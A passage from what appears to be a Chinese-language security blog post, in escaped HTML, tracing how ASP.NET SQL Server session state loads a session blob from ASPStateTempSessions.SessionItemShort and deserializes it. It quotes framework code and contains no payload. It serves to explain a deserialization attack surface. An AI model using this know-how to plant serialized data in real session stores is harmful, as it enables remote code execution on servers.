            &lt;span class=&quot;n&quot;&gt;SqlStateConnection&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SqlCommand&lt;/span&gt;          &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;GetConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TempGetExclusive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_partitionInfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AppSuffix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// @id&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @itemShort&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @locked&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @lockDate or @lockAge&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @lockCookie&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @actionFlags&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SqlExecuteReaderWithRetry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandBehavior&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                                &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                            &lt;span class=&quot;nf&quot;&gt;ThrowSqlConnectionException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;cm&quot;&gt;/* Get short item */&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;MemoryStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_configCompressionEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;_rqOrigStreamLen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nf&quot;&gt;DisposeOrReuseConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SqlStateConnection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDisposable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SqlCommand&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SqlCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dbo.TempGetStateItem3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_sqlConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommandType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StoredProcedure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommandTimeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_commandTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;c1&quot;&gt;// ignore process of setting parameters&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;我們可以從程式碼清楚看出主要是呼叫 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASPState.dbo.TempGetStateItem3&lt;/code&gt; Stored Procedure 取得 Session 的序列化二進制資料並保存到 buf 變數，最後將 buf 傳入 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SessionStateUtility.DeserializeStoreData&lt;/code&gt; 進行反序列化還原出 Session 物件，而 TempGetStateItem3 這個 SP 則是相當於在執行 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT SessionItemShort FROM [ASPState].dbo.ASPStateTempSessions&lt;/code&gt;，所以可以知道 Session 是儲存在 ASPStateTempSessions 資料表的 SessionItemShort 欄位中。接著讓我們繼續往下看關鍵的 DeserializeStoreData 做了什麼樣的操作。同樣地，行數偏多，有需求的朋友請自行下拉 XD&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web.SessionState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SessionStateUtility&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SecurityPermission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SecurityAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SerializationFormatter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Stream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionStateItemCollection&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Byte&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;BinaryReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;BinaryReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateItemCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SessionStateItemCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetSessionStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

